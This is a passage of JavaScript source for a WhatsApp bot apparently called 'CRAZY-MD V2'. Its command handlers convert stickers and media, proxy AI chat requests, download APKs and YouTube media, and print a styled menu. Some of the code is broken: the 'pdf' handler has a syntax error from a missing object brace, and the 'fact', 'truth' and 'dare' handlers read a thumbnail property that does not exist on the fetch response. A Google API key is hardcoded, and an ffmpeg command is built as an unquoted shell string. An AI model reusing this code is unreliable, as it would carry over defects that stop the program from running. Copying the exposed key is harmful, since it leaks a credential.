let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    XeonBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            
            case 'ai':
    if (!q) return replygcxeon('Please provide a message to send to the chatbot.');

    const apiUrl = `https://apis.davidcyriltech.my.id/ai/chatbot?query=${encodeURIComponent(q)}`;

    try {
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (data && data.result) {
            replygcxeon(`🤖 *Ai response:*\n\n ${data.result}`);
        } else {
            replygcxeon("❌ No response received from the chatbot.");
        }
    } catch (err) {
        replygcxeon(`❌ Error connecting to API : ${err.message}`);
    }

    break;
    
    case 'mediafire': {
            await XeonBotInc.sendMessage(m.chat, { react: { text: "📤",key: m.key,}})
    if (!text) return replygcxeon(`*Example*: ${prefix + command} https://www.mediafire.com/file/rmpx6iv7kiboki.zip/file`);

    try {
        
        await XeonBotInc.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });


        const apiUrl = `https://apis.davidcyriltech.my.id/mediafire?url=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);

    
        if (apiResponse.data && apiResponse.data.downloadLink) {
            const { fileName, mimeType, downloadLink } = apiResponse.data;


            await XeonBotInc.sendMessage(m.chat, {
                document: { url: downloadLink },
                mimetype: mimeType,
                fileName: fileName,
                caption: `📦 *File Name:* ${fileName}\n> ◆ ║ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ*`
            }, { quoted: m });
        } else {

            replygcxeon(`*Failed to fetch file details! Please check the MediaFire URL and try again.*`);
        }
    } catch (error) {

        console.error('Error during MediaFire command:', error);
        replygcxeon(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

case 'apk': {
            await XeonBotInc.sendMessage(m.chat, { react: { text: "📦",key: m.key,}})
  if (!text) return replygcxeon(`*Example:* ${prefix + command} WhatsApp`);

  try {
    const apiUrl = `https://apis.davidcyriltech.my.id/download/apk?text=${encodeURIComponent(text)}`;
    const response = await axios.get(apiUrl, { timeout: 10000 });

    // Validate API response
    if (!response.data || !response.data.success) {
      return replygcxeon('❌ *Failed to fetch APK. Try again later.*');
    }

    const { apk_name, thumbnail, download_link } = response.data;

    // Send APK details with thumbnail
    await XeonBotInc.sendMessage(m.chat, {
      image: { url: thumbnail },
      caption: `📥 *APK Downloader* 📥\n` +
        `📌 *Name:* ${apk_name}\n` +
        `> ◆ ║ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ*`
    }, { quoted: m });

    // Send APK file immediately after
    await XeonBotInc.sendMessage(m.chat, {
      document: { url: download_link },
      mimetype: 'application/vnd.android.package-archive',
      fileName: `${apk_name}.apk`
    }, { quoted: m }).catch(err => {
      console.error('Error sending APK:', err);
      replygcxeon('❌ *Failed to send APK file. It might be too large or restricted by WhatsApp.*');
    });

  } catch (error) {
    console.error('Error in APK Downloader:', error?.response?.data || error.message);

    // Handle specific errors
    if (error.code === 'ECONNABORTED') {
      replygcxeon('⚠️ *API request timed out. Please try again.*');
    } else if (error.response && error.response.status === 404) {
      replygcxeon('❌ *APK not found. Please check the name and try again.*');
    } else {
      replygcxeon('❌ *An unexpected error occurred. Try again later.*');
    }
  }

  break;
}
                 
     case 'ss': case 'ssweb': {
            await XeonBotInc.sendMessage(m.chat, { react: { text: "📷",key: m.key,}})
  if (!args[0]) return replygcxeon(`Please provide a link\n\n Example: ${prefix + command}.`);
  await XeonBotInc.sendMessage(m?.chat, { react: { text: `📸`, key: m?.key } });

  let apiUrl = `https://apis.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(args[0])}`;

  try {
    await XeonBotInc.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🖼️ Screenshot of ${args[0]}` }, { quoted: m });
  } catch (error) {
    console.error(error);
    replygcxeon('Failed to capture the screenshot. Please try again later.');
  }
  break;
}
    case 'llama':
    if (!q) return replygcxeon('Please provide text to send to the AI.');
    
    // URL de l'API avec le texte fourni par l'utilisateur
    const url = `https://apis.davidcyriltech.my.id/ai/llama3?text=${encodeURIComponent(q)}`;
    
    try {
        // Effectuer la requête GET
        const response = await fetch(url);
        const data = await response.json();
        
        // Vérifier si l'API renvoie une réponse
        if (data && data.response) {
            // Envoi de la réponse de l'API au groupe
            replygcxeon(`Llama Response:\n\n ${data.response}`);
        } else {
            replygcxeon('No response received from the AI.');
        }
    } catch (err) {
        // Gestion des erreurs
        replygcxeon(`Error: ${err.message}`);
    }
    break;
    case 'tomp4':
    case 'tovideo': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            
            case 'deepseek':
    if (!q) return replygcxeon('Please enter some text to send to DeepSeek.');

    const apiDeepSeek = `https://apis.davidcyriltech.my.id/ai/deepseek-v3?text=${encodeURIComponent(q)}`;

    try {
        const res = await fetch(apiDeepSeek);
        const data = await res.json();

        if (data && data.result) {
            replygcxeon(`🧠 *DeepSeek AI:*\n\n ${data.result}`);
        } else {
            replygcxeon("❌ No response received from DeepSeek.");
        }
    } catch (err) {
        replygcxeon(`❌ Error connecting to API : ${err.message}`);
    }

    break;
    
    case 'toaud':
    case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `dgxeon.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcxeon(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcxeon(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcxeon(`Example : ${prefix + command} ðŸ˜…+ðŸ¤”`)
                if (!emoji2) return replygcxeon(`Example : ${prefix + command} ðŸ˜…+ðŸ¤”`)
                replygcxeon(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcxeon(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replygcxeon(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await XeonBotInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break 
            case 'afk':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (isAfkOn) return replygcxeon("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replygcxeon(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case 'play': case 'song': {
            await XeonBotInc.sendMessage(m.chat, { react: { text: "🎧",key: m.key,}})
    if (!text) {
        return replygcxeon(`Example: ${prefix + command} Lamanaa`);
    }

    try {
        let kyuu = await fetchJson(`https://api.agatz.xyz/api/ytsearch?message=${encodeURIComponent(text)}`);
        let songData = kyuu.data[0];
        if (!songData) {
            return replygcxeon("Song not found. Please try another search.");
        }

        // Send a "Playing song requested" message with a large thumbnail at the bottom
        await XeonBotInc.sendMessage(m.chat, {
            text: `🎵 *ʜᴇʀᴇ ɪs ʏᴏᴜʀ sᴏɴɢ:* ${songData.title}`,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CRAZY-TECH",
                    newsletterJid: "120363400129137847@newsletter",
                },
                externalAdReply: {
                    title: "ᴄʀᴀᴢʏ-ᴍᴅ_ᴠ2",
                    body: `🎵 ᴍᴜsɪᴄ ᴘʟᴀʏᴇʀ 🎵`,
                    thumbnailUrl: songData.thumbnail || 'https://files.catbox.moe/cfqz6q.jpeg', // Use thumbnail or default
                    sourceUrl: global.link,
                    mediaType: 1,
                    renderLargerThumbnail: true, // Render the large thumbnail below
                    thumbnailHeight: 500,
                    thumbnailWidth: 500, // Ensure thumbnail is large
                },
            },
        }, { quoted: m });

        // Fetch audio URL
        let tylor = await fetchJson(`https://api.nexoracle.com/downloader/yt-audio2?apikey=free_key@maher_apis&url=${songData.url}`);
        let audioUrl = tylor.result.audio;
        if (!audioUrl) {
            return reply("Unable to fetch audio. Please try again.");
        }

        // Send the song as an audio file
        await XeonBotInc.sendMessage(m.chat, {
            audio: { url: audioUrl },
            fileName: `${songData.title}.mp3`,
            mimetype: "audio/mpeg",
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CRAZY-TECH",
                    newsletterJid: "120363400129137847@newsletter",
                },
                externalAdReply: {
                    title: "ᴄʀᴀᴢʏ-ᴍᴅ_ᴠ2",
                    body: `${songData.title}.mp3`,
                    thumbnailUrl: songData.thumbnail || 'https://files.catbox.moe/cfqz6q.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailHeight: 500,
                    thumbnailWidth: 500,
                },
            },
        }, { quoted: m });

    } catch (error) {
        console.error("Error in play command:", error);
        replygcxeon("An error occurred while processing your request. Please try again later.");
    }
}
break;

case 'pdf': {
    if (!text) {
        return replygcxeon(`❗ *Usage:* prefix + command <text>📌 *Example:*${prefix + command} Hello, this is a test.`);
    }

    try {
        const res = await fetch(`https://apis.davidcyriltech.my.id/tools/pdf?text=${encodeURIComponent(text)}`);
        const buffer = await res.buffer();

        await XeonBotInc.sendMessage(m.chat, 
            document: buffer,
            fileName: 'document.pdf',
            mimetype: 'application/pdf',
            caption: `📄 *PDF generated successfully!*📝 *Text:* ${text}`,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CRAZY-TECH",
                    newsletterJid: "120363400129137847@newsletter",
                },
                externalAdReply: {
                    title: "ᴄʀᴀᴢʏ-ᴍᴅ_ᴠ2",
                    body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ.",
                    thumbnailUrl: response.result.thumbnail || 'https://files.catbox.moe/cfqz6q.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });

    } catch (error) {
        console.error("Error generating PDF:", error);
        replygcxeon("⚠️ An error occurred while generating the PDF. Please try again later.");
    }
}
break;

case 'fact': {
    await XeonBotInc.sendMessage(m.chat, { react: { text: "📘", key: m.key } });

    try {
        const response = await fetch('https://apis.davidcyriltech.my.id/fact');
        const json = await response.json();

        if (!json?.fact) {
            return replygcxeon("❌ Unable to retrieve a fact. Try again later.");
        }

        await XeonBotInc.sendMessage(m.chat, {
            text: `🧠 *Fact:* ${json.fact}`,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CRAZY-TECH",
                    newsletterJid: "120363400129137847@newsletter",
                },
                externalAdReply: {
                    title: "ᴄʀᴀᴢʏ-ᴍᴅ_ᴠ2",
                    body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ.",
                    thumbnailUrl: response.result.thumbnail || 'https://files.catbox.moe/cfqz6q.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });
        } catch (err) {
        console.error('Fact command error:', err);
        replygcxeon("⚠️ Failed to fetch a fact. Please try again later.");
    }
}
break;

case 'truth': {
    try {
        // Fetch the truth question from the API
        const response = await fetch('https://apis.davidcyriltech.my.id/truth');
        const result = await response.json();
        
        // Check if the response is valid
        if (result && result.question) {
            // Send the truth question to the chat
            await XeonBotInc.sendMessage(m.chat, {
                text: `🎯 *Truth Question:* \n\n${result.question}`,
                contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CRAZY-TECH",
                    newsletterJid: "120363400129137847@newsletter",
                },
                externalAdReply: {
                    title: "ᴄʀᴀᴢʏ-ᴍᴅ_ᴠ2",
                    body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ.",
                    thumbnailUrl: response.result.thumbnail || 'https://files.catbox.moe/cfqz6q.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });
        } else {
        replygcxeon("⚠️ Could not fetch a truth question. Please try again later.");
        }
    } catch (error) {
        console.error("Error fetching truth question:", error);
        replygcxeon("⚠️ An error occurred while fetching the truth question. Please try again later.");
    }
}
break;

case 'dare': {
    try {
        // Fetch the dare from the API
        const response = await fetch('https://apis.davidcyriltech.my.id/dare');
        const result = await response.json();
        
        // Check if the result contains a dare
        if (result && result.dare) {
            // Send the dare with the additional context info
            await XeonBotInc.sendMessage(m.chat, {
                text: `🎯 *Dare Challenge:* \n\n${result.dare}`,
                contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CRAZY-TECH",
                    newsletterJid: "120363400129137847@newsletter",
                },
                externalAdReply: {
                    title: "ᴄʀᴀᴢʏ-ᴍᴅ_ᴠ2",
                    body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ.",
                    thumbnailUrl: response.result.thumbnail || 'https://files.catbox.moe/cfqz6q.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });
        } else {
            replygcxeon("⚠️ Could not fetch a dare. Please try again later.");
        }
    } catch (error) {
        console.error("Error fetching dare:", error);
        replygcxeon("⚠️ An error occurred while fetching the dare. Please try again later.");
    }
}
break;

case 'url': {
            await XeonBotInc.sendMessage(m.chat, { react: { text: "🖇️",key: m.key,}})
    try {
        // Required libraries
        const axios = require('axios');
        const FormData = require('form-data');
        const fs = require('fs-extra');

        // Function to upload a file to Catbox and return the URL
        async function uploadToCatbox(filePath) {
            if (!fs.existsSync(filePath)) throw new Error("File does not exist");
            try {
                const data = new FormData();
                data.append('reqtype', 'fileupload');
                data.append('userhash', '');
                data.append('fileToUpload', fs.createReadStream(filePath));

                const config = {
                    method: 'POST',
                    url: 'https://catbox.moe/user/api.php',
                    headers: {
                        ...data.getHeaders(),
                    },
                    data: data,
                };

                const api = await axios.request(config);
                return api.data.trim();
            } catch (error) {
                console.error('Error uploading to Catbox:', error.message);
                throw new Error('Failed to upload to Catbox');
            }
        }

        // Check if a reply message exists (image, video, or audio)
        if (!m.quoted) return replygcxeon("Please reply to an image, video, or audio file.");

        let mediaPath;
        try {
            // Attempt to download the media file
            mediaPath = await XeonBotInc.downloadAndSaveMediaMessage(m.quoted);
        } catch (err) {
            console.error("Error while downloading media:", err);
            return replygcxeon("❌ Unable to download the media file. Please try again.");
        }

        if (!mediaPath) {
            return replygcxeon("❌ No media file detected. Please reply to an image, video, or audio message.");
        }

        // Upload the file using the integrated function
        const fileUrl = await uploadToCatbox(mediaPath);

        // Delete the local file after uploading
        fs.unlinkSync(mediaPath);

        // Send the uploaded URL as a reply
        replygcxeon(`✅ Successfully uploaded! Here is your URL:\n${fileUrl}`);
    } catch (error) {
        console.error("Error while uploading to Catbox:", error);
        replygcxeon("❌ Oops, something went wrong while creating your URL.");
    }
    break;
}
/*
case "ytmp3": case "ytaudio":
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replygcxeon(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await xeonaudp3.mp3(text)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }
    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
*/
case 'ytmp4': case 'ytvideo': {
            await XeonBotInc.sendMessage(m.chat, { react: { text: "💯",key: m.key,}})
    if (!text) {
        return replygcxeon(`Example: ${prefix + command} https://youtube.com/shorts/7Hzb0fvSLPk?si=UZX8lW_k0yuEjAEb`);
    }

    try {
        let response = await fetchJson(`https://api.nexoracle.com/downloader/yt-video2?apikey=free_key@maher_apis&url=${encodeURIComponent(text)}`);
        let videoUrl = response.result.video;
        if (!videoUrl) {
            return replygcxeon("Failed to fetch video. Please try again.");
        }

        await XeonBotInc.sendMessage(m.chat, {
            text: `🎥 *Downloading Video:* ${text}`,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CRAZY-TECH",
                    newsletterJid: "120363400129137847@newsletter",
                },
                externalAdReply: {
                    title: "ᴄʀᴀᴢʏ-ᴍᴅ_ᴠ2",
                    body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ.",
                    thumbnailUrl: response.result.thumbnail || 'https://files.catbox.moe/cfqz6q.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });

        await XeonBotInc.sendMessage(m.chat, {
            video: { url: videoUrl },
            fileName: `${response.result.title}.mp4`,
            mimetype: "video/mp4",
        }, { quoted: m });

    } catch (error) {
        console.error("Error in YTMP4/YTVIDEO command:", error);
        replygcxeon("An error occurred while processing your request. Please try again.");
    }
}
break;

case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

case 'crazy':
xeonimun(`╔═════ ∘◦ ✧ ◦∘ ═════╗
  👨‍💻 𝘾𝙧𝙖𝙯𝙮 𝘿𝙚𝙫 – 𝙁𝙪𝙡𝙡𝙨𝙩𝙖𝙘𝙠 𝙒𝙞𝙯𝙖𝙧𝙙
╚═════ ∘◦ ✧ ◦∘ ═════╝

🧠 Skilled in:
⚙️ JavaScript | Node.js | React | MongoDB
📱 Bot Dev (WhatsApp | Telegram)
🌐 API integration & automation

🛠️ Passionate about building clean, fast, and scalable systems.
🧩 Always pushing limits – code is not just syntax, it's art.

📲 Follow my journey on WhatsApp:
🔗 https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C
`)
break
case 'menu':
case 'allmenu':

await XeonBotInc.sendMessage(m.chat, { react: { text: "💫",key: m.key,}})

let xeonmenuoh = `‎╭━〔 *𝐂𝐑𝐀𝐙𝐘-𝐌𝐃 𝐕２* 〕━┈⊷
‎┃╭──────────────
‎┃│👤 ᴜsᴇʀ : *${pushname}*
‎┃│🧭 ʙᴀɪʟᴇʏs : *Multi Device*
‎┃│👨‍💻 ᴛʏᴘᴇ : *ɴᴏᴅᴇᴊs*
‎┃│🤖 ᴘʀᴇғɪx : *[.]*
‎┃│🚀 ᴠᴇʀsɪᴏɴ : *2.0.3 Bᴇᴛᴀ*
‎┃│💻 ᴄᴏᴍᴍᴀɴᴅs : *204*
‎┃│⏱️ ᴀʟᴡᴀʏs ᴏɴʟɪɴᴇ : ᴛʀᴜᴇ
‎┃│⏳ ᴛɪᴍᴇ : *${xeonytimewisher}*
‎┃╰─────────────────
‎╰━━━━━━━━━━━━━━━━━━━
‎╭━━━〔ᴏᴡɴᴇʀ-ᴍᴇɴᴜ〕━━━┈⊷
‎┃╭───────=──────
‎┃│ɢᴇᴛsᴇssɪᴏɴ
‎┃│ᴅᴇʟsᴇssɪᴏɴ
‎┃│ᴘᴘ
‎┃│ᴊᴏɪɴ
‎┃│sʜᴜᴛᴅᴏᴡɴ
‎┃│ʀᴇsᴛᴀʀᴛ
‎┃│ᴍᴏᴅᴇ sᴇʟғ/ᴘᴜʙʟɪᴄ
‎┃│ʙʟᴏᴄᴋ
‎┃│ʙᴀᴄᴋᴜᴘ
‎┃│ɢᴇᴛᴄᴀsᴇ
‎┃│ᴀᴅᴅᴏᴡɴᴇʀ
‎┃│ᴅᴇʟᴏᴡɴᴇʀ
‎┃│ɢᴇᴛᴊɪᴅ
‎┃╰──
‎┃╰──ll
‎┗━━━━━━━━━━━━━━━━⊱
‎╭━━━〔ɢʀᴏᴜᴘ-ᴍᴇɴᴜ〕━━━┈⊷
‎┃╭───────=──────
‎┃│ᴄʟᴏsᴇᴛɪᴍᴇ
‎┃│ᴏᴘᴇɴᴛɪᴍᴇ
‎┃│ᴀᴅᴅ
‎┃│ᴋɪᴄᴋ
‎┃│sᴇᴛᴅᴇsᴄ
‎┃│ᴅᴇʟᴅᴇsᴄ
‎┃│ᴛᴀɢᴀʟʟ
‎┃│ʜɪᴅᴇᴛᴀɢ
‎┃│ᴘʀᴏᴍᴏᴛᴇ
‎┃│ᴅᴇᴍᴏᴛᴇ
‎┃│ᴋɪᴄᴋᴀʟʟ
‎┃│ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
‎┃│ᴅᴇᴍᴏᴛᴇᴀʟʟ
‎┃│ᴄʀᴀᴢʏ-ᴛᴇᴄʜ
‎┃╰──
‎┃╰──ll
‎┗━━━━━━━━━━━━━━━━⊱
‎╭━━━〔ᴀɪ-ᴍᴇɴᴜ〕━━━┈⊷
‎┃╭───────=──────
‎┃│ᴀɪ
‎┃│ᴅᴇᴇᴘsᴇᴇᴋ
‎┃│ʟʟᴀᴍᴀ
‎┃╰──
‎┃╰──ll
‎┗━━━━━━━━━━━━━━━━⊱
‎╭━━━〔ᴏᴛʜᴇʀ-ᴍᴇɴᴜ〕━━━┈⊷
‎┃╭───────=──────
‎┃│ᴄʜᴀɴɴᴇʟsᴜᴘᴘᴏʀᴛ
‎┃│ᴍᴇɴᴜ
‎┃│ᴄʀᴀᴢʏ
‎┃│ɪɴғᴏ
‎┃│ᴀʟɪᴠᴇ
‎┃│ʀᴜɴᴛɪᴍᴇ
‎┃│ᴘɪɴɢ
‎┃│ᴅᴇᴠ
‎┃│ᴏᴡɴᴇʀ
‎┃╰──
‎┃╰──ll
‎┗━━━━━━━━━━━━━━━━⊱
‎╭━━━〔ᴄᴏɴᴠᴇʀᴛ-ᴍᴇɴᴜ〕━━━┈⊷
‎┃╭───────=──────
‎┃│sᴍᴇᴍᴇ
‎┃│ᴛᴏɪᴍᴀɢᴇ
‎┃│ᴛᴏᴍᴘ3
‎┃│ᴛᴏᴀᴜᴅɪᴏ
‎┃│ᴛᴏᴠɴ
‎┃│ᴛᴏɢɪғ
‎┃│sᴛɪᴄᴋᴇʀ
‎┃│ᴛᴀᴋᴇ
‎┃│ᴘᴅғ
‎┃│ᴜʀʟ
‎┃│ᴛɪɴʏᴜʀʟ
‎┃╰──
‎┃╰──ll
‎┗━━━━━━━━━━━━━━━━⊱
‎╭━━━〔ʜᴏᴛ-ᴍᴇɴᴜ〕━━━┈⊷
‎┃╭───────=──────
